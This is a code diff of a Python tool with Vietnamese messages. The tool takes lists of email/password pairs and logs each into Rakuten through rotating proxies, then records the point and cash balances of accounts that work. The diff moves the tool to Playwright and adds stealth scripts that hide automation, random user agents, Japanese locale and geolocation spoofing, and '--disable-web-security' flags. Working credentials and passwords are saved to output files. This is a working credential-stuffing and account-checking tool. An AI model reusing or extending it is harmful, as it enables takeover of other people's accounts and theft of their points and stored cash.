@@ -1,9 +1,3 @@
-import shutil
-import undetected_chromedriver as uc
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver import ActionChains
 import time
 import random
 import logging
@@ -15,58 +9,146 @@ from datetime import datetime
 import signal
 import sys
 import atexit
-import chromedriver_autoinstaller
-import psutil
 import shutil
 import requests
-from selenium.common.exceptions import TimeoutException
-import subprocess
 import pyautogui
+from playwright.sync_api import sync_playwright
+import subprocess
+from fake_useragent import UserAgent
+
+stealth_js = """
+        () => {
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        Object.defineProperty(navigator, 'plugins', {
+            get: () => [
+                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
+                { name: 'Native Client', filename: 'internal-nacl-plugin', description: '' },
+            ],
+        });
+        Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP', 'ja'] });
+    }
+"""
+
+# Set Playwright browsers path for bundled executable
+if getattr(sys, 'frozen', False):
+    # Running as bundled executable
+    bundle_dir = sys._MEIPASS
+    browsers_path = os.path.join(bundle_dir, 'playwright_browsers')
+    if not os.path.exists(browsers_path):
+        browsers_path = os.path.join(os.path.dirname(sys.executable), 'playwright_browsers')
+    os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
+# else:
+#     # Running as script
+#     os.environ["PLAYWRIGHT_BROWSERS_PATH"] = "0"
+
 colorama.init()
 
-drivers = []
 successful_accounts = []
 failed_accounts = []
+browsers = []
 
-def kill_child_processes(pid, sig=15):
+def ensure_browsers_installed():
+    """Ensure Playwright browsers are installed, especially for bundled executables"""
     try:
-        parent = psutil.Process(pid)
-        children = parent.children(recursive=True)
-        for child in children:
+        # For bundled executables, try to use portable browser approach
+        if getattr(sys, 'frozen', False):
+            logging.info("Đang chạy từ executable, kiểm tra browsers...")
+            
+            # Check if browsers exist in the expected paths
+            exe_dir = os.path.dirname(sys.executable)
+            possible_browser_paths = [
+                os.path.join(exe_dir, 'playwright_browsers'),
+                os.path.join(exe_dir, '..', 'playwright_browsers'),
+                os.path.join(os.getcwd(), 'playwright_browsers'),
+            ]
+            
+            for browser_path in possible_browser_paths:
+                if os.path.exists(browser_path):
+                    chromium_path = os.path.join(browser_path, 'chromium-*', 'chrome-win', 'chrome.exe')
+                    import glob
+                    if glob.glob(chromium_path):
+                        os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browser_path
+                        logging.info(f"✅ Đã tìm thấy browsers tại: {browser_path}")
+                        return True
+            
+            # Try to install browsers to current directory
+            logging.info("Đang thử cài đặt browsers...")
+            browsers_path = os.path.join(os.getcwd(), 'playwright_browsers')
+            if not os.path.exists(browsers_path):
+                os.makedirs(browsers_path, exist_ok=True)
+            
+            os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
+            
             try:
-                child.send_signal(sig)
-            except Exception:
-                pass
-        gone, alive = psutil.wait_procs(children, timeout=3)
-        for p in alive:
+                # Try multiple approaches to install browsers
+                install_commands = [
+                    ['python', '-m', 'playwright', 'install', 'chromium'],
+                    ['playwright', 'install', 'chromium'],
+                    ['npx', 'playwright', 'install', 'chromium']
+                ]
+                
+                for cmd in install_commands:
+                    try:
+                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300,
+                                              env={**os.environ, 'PLAYWRIGHT_BROWSERS_PATH': browsers_path})
+                        if result.returncode == 0:
+                            logging.info("✅ Đã cài đặt browsers thành công")
+                            return True
+                        else:
+                            logging.debug(f"Command {' '.join(cmd)} failed: {result.stderr}")
+                    except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
+                        logging.debug(f"Command {' '.join(cmd)} error: {e}")
+                        continue
+                
+                # If all installation attempts fail, show error
+                logging.error("❌ Không thể cài đặt browsers tự động")
+                logging.error("📝 Hướng dẫn khắc phục:")
+                logging.error("1. Tải và giải nén Chromium vào thư mục 'playwright_browsers'")
+                logging.error("2. Hoặc chạy: python -m playwright install chromium")
+                logging.error("3. Sau đó copy thư mục browsers vào cùng thư mục với file .exe")
+                return False
+                
+            except Exception as e:
+                logging.warning(f"⚠️ Lỗi khi cài đặt browsers: {e}")
+                return False
+                
+        else:
+            # For non-bundled version, try normal installation
             try:
-                p.kill()
-            except Exception:
-                pass
+                result = subprocess.run(['python', '-m', 'playwright', 'install', 'chromium'], 
+                                      capture_output=True, text=True, timeout=300)
+                if result.returncode == 0:
+                    logging.info("✅ Đã cài đặt browsers thành công")
+                    return True
+                else:
+                    logging.warning(f"Không thể cài đặt browsers: {result.stderr}")
+                    return False
+            except Exception as e:
+                logging.warning(f"Lỗi khi cài đặt browsers: {e}")
+                return False
+                
     except Exception as e:
-        pass
-        # logging.warning(f"Không thể kill process con cho PID {pid}: {e}")
+        logging.warning(f"Lỗi trong ensure_browsers_installed: {e}")
+        return False
 
-def cleanup_drivers():
-    """Dọn dẹp tất cả các WebDriver instances."""
-    logging.warning("Đang dọn dẹp drivers...")
-    global drivers
-    for driver in drivers[:]:
+def cleanup_browsers():
+    """Dọn dẹp tất cả các Browser instances."""
+    logging.warning("Đang dọn dẹp browsers...")
+    global browsers
+    for browser in browsers[:]:
         try:
-            driver.close()
-            driver.quit()
-            if hasattr(driver, 'service') and driver.service.process:
-                kill_child_processes(driver.service.process.pid)
+            browser.close()
         except Exception as e:
-            logging.warning(f"Lỗi khi đóng driver: {e}")
+            logging.warning(f"Lỗi khi đóng browser: {e}")
         finally:
-            if driver in drivers:
-                drivers.remove(driver)
+            if browser in browsers:
+                browsers.remove(browser)
 
 def signal_handler(sig, frame):
     """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
     logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
-    cleanup_drivers()
+    cleanup_browsers()
     clean_all_user_data()
     logging.info("Dọn dẹp hoàn tất. Thoát...")
     sys.exit(0)
@@ -111,29 +193,10 @@ logging.basicConfig(
     handlers=[file_handler, console_handler]
 )
 
-# Hide verbose logs from undetected_chromedriver and other modules
-logging.getLogger('undetected_chromedriver').setLevel(logging.ERROR)
-logging.getLogger('selenium').setLevel(logging.ERROR)
-logging.getLogger('selenium.webdriver').setLevel(logging.ERROR)
-logging.getLogger('selenium.webdriver.remote').setLevel(logging.ERROR)
-logging.getLogger('selenium.webdriver.common').setLevel(logging.ERROR)
+# Hide verbose logs
+logging.getLogger('playwright').setLevel(logging.WARNING)
 logging.getLogger('urllib3').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire.server').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire.handler').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire.proxy').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire.thirdparty').setLevel(logging.WARNING)
-logging.getLogger('seleniumwire.thirdparty.mitmproxy').setLevel(logging.WARNING)
-logging.getLogger('WDM').setLevel(logging.WARNING)
-os.environ['WDM_LOG'] = '0'
-# Suppress specific warnings
-import warnings
-warnings.filterwarnings("ignore", category=UserWarning, module="seleniumwire")
-warnings.filterwarnings("ignore", message="pkg_resources is deprecated")
-warnings.filterwarnings("ignore", category=DeprecationWarning)
-warnings.filterwarnings("ignore", message="Cache folder")
-warnings.filterwarnings("ignore", message=".*cannot be created.*")
-warnings.filterwarnings("ignore", message=".*Permission denied.*")
+
 # Global variables
 file_lock = threading.Lock()
 show_browser = True
@@ -162,19 +225,39 @@ def load_input_files():
                     if line and not line.startswith('#'):
                         # Handle different proxy formats
                         if '@' in line:
-                            # Format: host:port@username-password
+                            # Format: host:port@username:password
                             try:
                                 host_port, credentials = line.split('@', 1)
+                                if ':' in credentials:
+                                    username, password = credentials.split(':', 1)
+                                else:
+                                    username, password = credentials, ""
+                                
                                 proxies.append({
-                                    'host_port': host_port,
-                                    'credentials': credentials,
+                                    'server': f"http://{host_port}",
+                                    'username': username,
+                                    'password': password,
                                     'full': line
                                 })
-                            except:
-                                proxies.append({'host_port': line, 'credentials': None, 'full': line})
+                            except Exception as e:
+                                logging.warning(f"Không thể parse proxy: {line} - {e}")
                         else:
-                            # Standard format: host:port or host:port:user:pass
-                            proxies.append({'host_port': line, 'credentials': None, 'full': line})
+                            # Handle format: host:port:username:password or host:port
+                            parts = line.split(':')
+                            if len(parts) >= 4:
+                                proxies.append({
+                                    'server': f"http://{parts[0]}:{parts[1]}",
+                                    'username': parts[2],
+                                    'password': parts[3],
+                                    'full': line
+                                })
+                            elif len(parts) >= 2:
+                                proxies.append({
+                                    'server': f"http://{parts[0]}:{parts[1]}",
+                                    'username': None,
+                                    'password': None,
+                                    'full': line
+                                })
         except FileNotFoundError:
             logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
         
@@ -189,54 +272,42 @@ def load_input_files():
         logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
         raise
 
-def wait_for_document_loaded(driver, timeout=10):
-        end_time = time.time() + timeout
-        while time.time() < end_time:
-            try:
-                state = driver.execute_script("return document.readyState")
-                if state == "complete":
-                    return True
-            except Exception:
-                pass  # Driver might not be ready yet
-            time.sleep(1)
-        return False
-
-import subprocess
-
-def test_proxy_with_curl(proxy_address):
-    login_url = "https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in"
-    command_list = ["curl", "-x", proxy_address, login_url, "--max-time", "10", "-s", "-o", os.devnull]
+def test_proxy_connection(proxy_info):
+    """Test proxy connection before using it"""
     try:
-        subprocess.run(
-            command_list, 
-            stdout=subprocess.DEVNULL, 
-            stderr=subprocess.DEVNULL,
-            check=True 
-        )
-        return True
-    except:
+        import requests
+        proxy_dict = {
+            'http': f"http://{proxy_info['username']}:{proxy_info['password']}@{proxy_info['server'].replace('http://', '')}",
+            'https': f"http://{proxy_info['username']}:{proxy_info['password']}@{proxy_info['server'].replace('http://', '')}"
+        }
+        
+        response = requests.get('https://httpbin.org/ip', proxies=proxy_dict, timeout=10)
+        if response.status_code == 200:
+            logging.debug(f"Proxy test successful: {response.json()}")
+            return True
+        else:
+            logging.warning(f"Proxy test failed with status {response.status_code}")
+            return False
+    except Exception as e:
+        logging.warning(f"Proxy test failed: {e}")
         return False
 
-def init_driver(proxy=None, email=None, row=0, col=0, size=(1366, 768)):
-    """Khởi tạo Chrome driver với cài đặt không bị phát hiện"""
-    options = uc.ChromeOptions()
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--disable-infobars')
-    options.add_argument('--ignore-certificate-errors')
-    options.add_argument('--allow-insecure-localhost')
-    options.add_argument('--allow-running-insecure-content')
-    options.add_argument('--disable-web-security')
-    options.add_argument('--disable-gpu')
+def init_browser(proxy=None, email=None, size=(1366, 768)):
+    """Khởi tạo Playwright browser với cài đặt không bị phát hiện"""
     
-    # Random user agent
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0"
-    ]
-    options.add_argument(f'--user-agent={random.choice(user_agents)}')
+    try:
+        playwright = sync_playwright().start()
+    except Exception as e:
+        logging.error(f"Lỗi khởi tạo Playwright: {e}")
+        # Try to ensure browsers are installed
+        if ensure_browsers_installed():
+            try:
+                playwright = sync_playwright().start()
+            except Exception as e2:
+                logging.error(f"Vẫn không thể khởi tạo Playwright sau khi cài đặt browsers: {e2}")
+                raise
+        else:
+            raise
     
     # User data directory
     user_data_dir = os.path.join(os.getcwd(), "user-data")
@@ -244,98 +315,69 @@ def init_driver(proxy=None, email=None, row=0, col=0, size=(1366, 768)):
         user_data_dir = os.path.join(user_data_dir, f"user-data-{email.replace('@', '_').replace('.', '_')}")
     if not os.path.exists(user_data_dir):
         os.makedirs(user_data_dir)
-    options.add_argument(f'--user-data-dir={user_data_dir}')
-    if (proxy and show_browser):
-        options.add_argument(f'--proxy-server={proxy}')
     
-    # Headless mode
-    options.headless = (not show_browser)
+    # Browser launch options
+    launch_options = {
+        'headless': not show_browser,
+        'args': [
+            '--disable-blink-features=AutomationControlled',
+            '--no-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-infobars',
+            '--ignore-certificate-errors',
+            '--allow-insecure-localhost',
+            '--allow-running-insecure-content',
+            '--disable-web-security',
+            '--disable-gpu',
+            '--disable-features=VizDisplayCompositor'
+        ]
+    }
+    ua = UserAgent()
+    random_user_agent = ua.chrome
+    # Context options
+    context_options = {
+        'user_agent': random_user_agent,
+        'viewport': {'width': size[0], 'height': size[1]},
+        'locale': 'ja-JP',
+        'timezone_id': 'Asia/Tokyo',
+        "geolocation": {
+                'latitude': 35.6895,
+                'longitude': 139.6917
+        },
+        "permissions": ['geolocation']
+    }
+    
+    # Add proxy if provided
+    if proxy:
+        logging.debug(f"Setting up proxy: {proxy}")
+        context_options['proxy'] = proxy
     
     try:
-        version_main = chromedriver_autoinstaller.get_chrome_version()
-        version_main = int(version_main.split('.')[0])
-    except:
-        version_main = None
-
-    driver = None
-    driver = uc.Chrome(
-            options=options,
-            version_main=version_main,
-            use_subprocess=True,
-            headless=(not show_browser)
-    )
-    # Set window position and size
-    if show_browser:
-        width, height = size
-        x = col * width
-        y = row * height
-        driver.set_window_rect(x=x, y=y, width=width, height=height)
-    # Anti-detection scripts
-    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
-        "source": """
+        browser = playwright.chromium.launch(**launch_options)
+        context = browser.new_context(**context_options)
+        
+        # Anti-detection scripts
+        context.add_init_script("""
             Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
             window.navigator.chrome = { runtime: {} };
             Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
-            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
-        """
-    })
-    
-    return driver, user_data_dir
+            Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP', 'ja', 'en-US', 'en'] });
+        """)
+        
+        page = context.new_page()
+        
+        return browser, context, page, user_data_dir, playwright
+        
+    except Exception as e:
+        logging.error(f"Lỗi khởi tạo browser: {e}")
+        playwright.stop()
+        raise
 
-def human_type(element, text, min_delay=0.05, max_delay=0.15):
+async def human_type(page, selector, text, min_delay=0.05, max_delay=0.15):
     """Type text with human-like delay"""
-    element.clear()
+    await page.fill(selector, "")  # Clear first
     for char in text:
-        element.send_keys(char)
-        time.sleep(random.uniform(min_delay, max_delay))
-
-def wait_for_element_by_js(driver, selector, timeout=10):
-    start_time = time.time()
-    while True:
-        element = driver.execute_script(f"return document.querySelector('{selector}');")
-
-        if element:
-            return element
-        if time.time() - start_time > timeout:
-            raise TimeoutException(f"Không tìm thấy phần tử '{selector}'")
-        time.sleep(0.5)
-
-def wait_for_element(driver, by, value, timeout=10, clickable=False, selector_string = None):
-    """Wait for element to be present or clickable"""
-    try:
-        if clickable:
-            element = WebDriverWait(driver, timeout).until(
-                EC.element_to_be_clickable((by, value))
-            )
-        else:
-            element = WebDriverWait(driver, timeout).until(
-                EC.presence_of_element_located((by, value))
-            )
-        return element
-    except Exception as e:
-        try:
-            wait_for_element_by_js(driver, selector_string)
-        except Exception:
-            raise
-
-def safe_click(driver, element):
-    """Click an toàn với fallback về JavaScript"""
-    try:
-        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
-        time.sleep(0.3)
-        ActionChains(driver).move_to_element(element).click().perform()
-    except Exception as e:
-        try:
-            driver.execute_script("arguments[0].click();", element)
-        except Exception as e2:
-            logging.debug(f"Cả hai phương pháp click đều thất bại: {repr(e)}, {repr(e2)}")
-            raise
-
-def safe_wait_and_click(driver, by, value, timeout=10):
-    """Wait for element and click safely"""
-    element = wait_for_element(driver, by, value, timeout, clickable=True)
-    safe_click(driver, element)
-    return element
+        await page.type(selector, char, delay=random.uniform(min_delay, max_delay) * 1000)
 
 def _remove_account_from_file(email):
     """Remove account from accounts.txt file"""
@@ -356,30 +398,45 @@ def _remove_account_from_file(email):
     except Exception as e:
         logging.warning(f"Không thể xóa {email} khỏi accounts.txt: {e}")
 
-def check_rakuten_account(driver, email, password):
+def check_rakuten_account(browser, context, page, email, password):
     """Kiểm tra tài khoản Rakuten"""
     try:
         logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
         
-        # Navigate to login page
+        # Navigate to login page with retry logic
         login_url = ("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in")
         
-        driver.get(login_url)
-                
-        time.sleep(random.randint(2, 4))
+        # Try to navigate with retry mechanism
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                # Increase timeout for slow proxies
+                page.goto(login_url, timeout=60000)  # 60 seconds timeout
+                logging.debug(f"Successfully navigated to login page for {email} (attempt {attempt + 1})")
+                break
+            except Exception as e:
+                if attempt == max_retries - 1:
+                    logging.debug(f"Failed to navigate to login page for {email} after {max_retries} attempts: {repr(e)}")
+                    raise
+                else:
+                    logging.debug(f"Navigation attempt {attempt + 1} failed for {email}, retrying... Error: {repr(e)}")
+                    time.sleep(5)  # Wait before retry
+
+        time.sleep(random.randint(2, 5))
         
         # Step 1: Enter email
-        if not _enter_email(driver, email):
+        if not _enter_email(page, email):
             result = False, f"Lỗi nhập email cho {email}"
         # Step 2: Enter password
-        elif not _enter_password(driver, password):
+        elif not _enter_password(page, password):
             result = False, f"Lỗi nhập password cho {email}"
         # Step 3: Check login success
-        elif not _check_login_success(driver, email):
+        elif not _check_login_success(page, email):
             result = False, "Đăng nhập thất bại"
         else:
             # Step 4: Check points
-            result = _check_points(driver, email, password)
+            result = _check_points(page, email, password)
+        
         _remove_account_from_file(email)        
         return result
             
@@ -389,37 +446,38 @@ def check_rakuten_account(driver, email, password):
         _remove_account_from_file(email)
         return False, repr(e)
 
-def _enter_email(driver, email):
+def _enter_email(page, email):
     """Enter email in login form"""
     try:
         # Wait for email input field
-        email_input = wait_for_element(driver, By.NAME, "username", timeout=30, selector_string="input[name='username']")
+        page.wait_for_selector("input[name='username']", timeout=30000)
         
         # Type email with human-like delay
-        human_type(email_input, email)
+        page.fill("input[name='username']", email)
         time.sleep(random.randint(1, 2))
         
         # Click first submit button (Next)
-        safe_wait_and_click(driver, By.ID, "cta001", timeout=10)
+        page.click("#cta001")
         time.sleep(random.randint(2, 4))
         
         return True
         
     except Exception as e:
-        # logging.error(f"Lỗi khi nhập email: {repr(e)}")
+        logging.debug(f"Lỗi khi nhập email: {repr(e)}")
         return False
 
-def _enter_password(driver, password):
+def _enter_password(page, password):
     """Enter password in login form"""
     try:
         # Wait for password input field
-        password_input = wait_for_element(driver, By.NAME, "password", timeout=30, selector_string="input[name='password']")
+        page.wait_for_selector("input[name='password']", timeout=30000)
+        
         # Type password with human-like delay
-        human_type(password_input, password)
+        page.fill("input[name='password']", password)
         time.sleep(random.randint(1, 2))
         
         # Click second submit button (Next)
-        safe_wait_and_click(driver, By.ID, "cta011", timeout=10)
+        page.click("#cta011")
         
         # Wait for login to process
         time.sleep(5)
@@ -427,84 +485,124 @@ def _enter_password(driver, password):
         return True
         
     except Exception as e:
-        # logging.error(f"Lỗi khi nhập password cho {email}")
+        logging.debug(f"Lỗi khi nhập password: {repr(e)}")
         return False
 
-def _check_login_success(driver, email):
+def _check_login_success(page, email):
     """Check if login was successful"""
     try:
-        # Wait for potential redirect to rakuten.co.jp domain
-        WebDriverWait(driver, 15).until(
-            lambda d: "rakuten.co.jp" in d.current_url
+        # Wait for potential redirect to rakuten.co.jp domain with longer timeout for slow proxies
+        page.wait_for_function(
+            "window.location.href.includes('rakuten.co.jp')",
+            timeout=30000  # Increased to 30 seconds for slow proxies
         )
         
-        current_url = driver.current_url
+        current_url = page.url
         
         # If still on login page, login failed
         if "login.account.rakuten.com" in current_url:
             # Check for error messages
             try:
-                error_selectors = ".error, .alert, [class*='error'], [class*='alert']"
-                error_elements = driver.find_elements(By.CSS_SELECTOR, error_selectors)
+                error_elements = page.query_selector_all(".error, .alert, [class*='error'], [class*='alert']")
                 if error_elements:
-                    error_text = error_elements[0].text
+                    error_text = error_elements[0].text_content()
                     logging.debug(f"Đăng nhập thất bại cho {email}: {error_text}")
                     return False
             except:
                 pass
             
-            # logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
+            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
             return False
         
         return True
         
     except Exception as e:
-        # logging.error(f"Timeout hoặc lỗi chờ redirect cho {email}: {repr(e)}")
+        logging.debug(f"Timeout hoặc lỗi chờ redirect cho {email}: {repr(e)}")
         return False
 
-def _check_points(driver, email, password):
+def _check_points(page, email, password):
     """Check points information and save to appropriate file"""
     try:
-        # Navigate to points page
+        # Navigate to points page with retry
         points_url = "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"
-        driver.get(points_url)    
-        time.sleep(5)
+        
+        def goto_link(url):
+            max_retries = 2
+            for attempt in range(max_retries):
+                try:
+                    page.goto(url, timeout=30000) 
+                    page.wait_for_load_state('networkidle', timeout=15000)
+                    break
+                except Exception as e:
+                    if attempt == max_retries - 1:
+                        logging.debug(f"Failed to navigate to points page for {email}: {repr(e)}")
+                        return True, f"Đăng nhập thành công nhưng không thể truy cập trang điểm : {url}"
+                    else:
+                        logging.debug(f"Points page navigation attempt {attempt + 1} failed for {email}, retrying...")
+                        time.sleep(3)
+
+        goto_link(points_url)
         
         points_details = []
         
         try:
             try:
-                held_points_element = wait_for_element(driver, By.CSS_SELECTOR, ".point-total dd", timeout=5)
-                held_points_text = held_points_element.text.strip()
-                held_points_clean = ''.join(filter(str.isdigit, held_points_text))
-                if held_points_clean:
-                    held_points_value = int(held_points_clean)
-                    points_details.append(f"Total Point: {held_points_value:,}")
-                    logging.debug(f"📊 {email} - Points total: {held_points_value:,}")
+                page.wait_for_selector(".point-total dd", timeout=5000)
+                held_points_element = page.query_selector(".point-total dd")
+                if held_points_element:
+                    held_points_text = held_points_element.text_content().strip()
+                    held_points_clean = ''.join(filter(str.isdigit, held_points_text))
+                    if held_points_clean:
+                        held_points_value = int(held_points_clean)
+                        points_details.append(f"Total Point: {held_points_value:,}")
+                        logging.debug(f"📊 {email} - Points total: {held_points_value:,}")
             except Exception:
                 logging.debug(f"Không tìm thấy 'Points total' cho {email}")
 
             try:
-                operation_points_element = wait_for_element(driver, By.CSS_SELECTOR, ".point-gadget-display-point .point_num", timeout=5)
-                operation_points_text = operation_points_element.text.strip()
-                operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
-                if operation_points_clean:
-                    operation_points_value = int(operation_points_clean)
-                    points_details.append(f"Operation: {operation_points_value:,}")
-                    logging.debug(f"📈 {email} - Points in operation: {operation_points_value:,}")
+                page.wait_for_selector(".point-gadget-display-point .point_num", timeout=5000)
+                operation_points_element = page.query_selector(".point-gadget-display-point .point_num")
+                if operation_points_element:
+                    operation_points_text = operation_points_element.text_content().strip()
+                    operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
+                    if operation_points_clean:
+                        operation_points_value = int(operation_points_clean)
+                        points_details.append(f"Operation: {operation_points_value:,}")
+                        logging.debug(f"📈 {email} - Points in operation: {operation_points_value:,}")
             except Exception:
                 logging.debug(f"Không tìm thấy 'Points in operation' cho {email}")
 
             try:
-                add_points_element = wait_for_element(driver, By.CSS_SELECTOR, " #js-pointBankTotalBalance .point_num", timeout=5)
-                add_points_text = add_points_element.text.strip()
-                add_points_clean = ''.join(filter(str.isdigit, add_points_text))
-                if add_points_clean:
-                    add_points_value = int(add_points_clean)
-                    points_details.append(f"Add: {add_points_value:,}")
-                    logging.debug(f"➕ {email} - Points add: {add_points_value:,}")
+                page.wait_for_selector("#js-pointBankTotalBalance .point_num", timeout=5000)
+                add_points_element = page.query_selector("#js-pointBankTotalBalance .point_num")
+                if add_points_element:
+                    add_points_text = add_points_element.text_content().strip()
+                    add_points_clean = ''.join(filter(str.isdigit, add_points_text))
+                    if add_points_clean:
+                        add_points_value = int(add_points_clean)
+                        points_details.append(f"Add: {add_points_value:,}")
+                        logging.debug(f"➕ {email} - Points add: {add_points_value:,}")
             except Exception:
                 logging.debug(f"Không tìm thấy 'Points add' cho {email}")
+
+            goto_link("https://my.rakuten.co.jp/?l-id=pc_footer_account")
+            time.sleep(3)
+
+            try:
+                page.wait_for_selector('[data-ratid="available-rcash-area"]', timeout=5000)
+                cash_points_element = page.query_selector('[data-ratid="available-rcash-area"] span:nth-child(2)')
+                if cash_points_element:
+                    cash_points_text = cash_points_element.text_content().strip()
+                    cash_points_clean = ''.join(filter(str.isdigit, cash_points_text))
+                    if cash_points_clean:
+                        cash_points_value = int(cash_points_clean)
+                        points_details.append(f"Cash: {cash_points_value:,}")
+                        logging.debug(f"➕ {email} - Cash Point: {cash_points_value:,}")
+            except Exception:
+                logging.debug(f"Không tìm thấy 'Points add' cho {email}")
+
+            
+                
             if len(points_details) > 0:
                 points_summary = " | ".join(points_details)
                 logging.info(f"✅ {email} - ({points_summary})")
@@ -522,20 +620,20 @@ def _check_points(driver, email, password):
                     return True, "Không có điểm"
                 
         except Exception as e:
-            logging.warning(f"Không tìm thấy thông tin điểm cho {email}: {repr(e)}")
+            logging.debug(f"Không tìm thấy thông tin điểm cho {email}: {repr(e)}")
             # Still consider login successful even if can't read points
             return True, "Đăng nhập thành công nhưng không tìm thấy điểm"
             
     except Exception as e:
-        logging.warning(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
+        logging.debug(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
         return True, "Đăng nhập thành công nhưng lỗi kiểm tra điểm"
 
-def process_account(driver,user_data_dir, account, account_index):
+def process_account(browser, context, page, user_data_dir, playwright, account, account_index):
     """Xử lý đăng ký một tài khoản"""
     email, password = account['email'], account['password']
     try:
         logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
-        success, message = check_rakuten_account(driver, email, password)
+        success, message = check_rakuten_account(browser, context, page, email, password)
         if not success:
             logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
         with file_lock:
@@ -557,14 +655,22 @@ def process_account(driver,user_data_dir, account, account_index):
             with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                 f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
     finally:
-        # delete user_data_dir
+        # Cleanup browser resources
+        try:
+            context.close()
+            browser.close()
+            playwright.stop()
+        except Exception as e:
+            logging.debug(f"Lỗi khi đóng browser: {e}")
+        
+        # Delete user_data_dir
         for _ in range(3):
             try:
                 if user_data_dir and os.path.exists(user_data_dir):
                     shutil.rmtree(user_data_dir, ignore_errors=True)
+                break
             except:
                 time.sleep(5)
-            
 
 def clean_all_user_data(retries=5, delay=1):
     """Dọn dẹp tất cả thư mục dữ liệu người dùng"""
@@ -577,13 +683,9 @@ def clean_all_user_data(retries=5, delay=1):
                 logging.info("Đã dọn dẹp dữ liệu người dùng thành công.")
                 break
             except PermissionError:
-                # logging.debug(f"Đang dọn dẹp dữ liệu. Thử lại sau {delay}s...")
                 time.sleep(delay)
             except Exception as e:
-                # logging.error(f"Lỗi không mong muốn khi dọn dẹp dữ liệu người dùng: {repr(e)}")
                 time.sleep(delay)
-        # else:
-            # logging.error(f"Không thể dọn dẹp dữ liệu người dùng sau {retries} lần thử.")
 
 def check_key_live():
     """Kiểm tra key có live không từ GitHub"""
@@ -616,14 +718,31 @@ def check_key_live():
     except Exception as e:
         logging.warning(f"⚠️ Lỗi khi kiểm tra key: {repr(e)}. Tiếp tục chạy...")
         return True
-from proxy import MitmproxyManager
+
 def main():
     """Hàm chính"""
     global show_browser
-    
     # Check if key is live before proceeding
     if not check_key_live():
         logging.error("Dừng chương trình do key không hợp lệ.")
+        input("Nhấn Enter để thoát...")
+        sys.exit(1)
+    
+    # Ensure browsers are installed (especially important for bundled executables)
+    logging.info("Đang kiểm tra và chuẩn bị browsers...")
+    if not ensure_browsers_installed():
+        logging.error("❌ Không thể cài đặt hoặc tìm thấy Playwright browsers.")
+        logging.error("=" * 60)
+        logging.error("📝 HƯỚNG DẪN KHẮC PHỤC:")
+        logging.error("1. Tạo thư mục 'playwright_browsers' cùng với file .exe")
+        logging.error("2. Tải Chromium và giải nén vào thư mục đó:")
+        logging.error("   https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html")
+        logging.error("3. Hoặc copy từ máy đã cài Playwright:")
+        logging.error("   %USERPROFILE%\\AppData\\Local\\ms-playwright")
+        logging.error("4. Cấu trúc thư mục phải như sau:")
+        logging.error("   playwright_browsers/chromium-xxxx/chrome-win/chrome.exe")
+        logging.error("=" * 60)
+        logging.error("Hoặc đọc file BUILD_GUIDE.md để biết thêm chi tiết")
         input("Nhấn Enter để thoát...")
         sys.exit(1)
     
@@ -633,6 +752,7 @@ def main():
         
         # Clean previous user data
         clean_all_user_data()
+        
         # Get number of threads
         try:
             num_threads = int(input("Nhập số luồng để chạy: "))
@@ -649,7 +769,7 @@ def main():
         # Nhập lựa chọn hiển thị trình duyệt
         show = input("Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ").strip().lower()
         show_browser = show in ['y', 'yes']
-        
+                
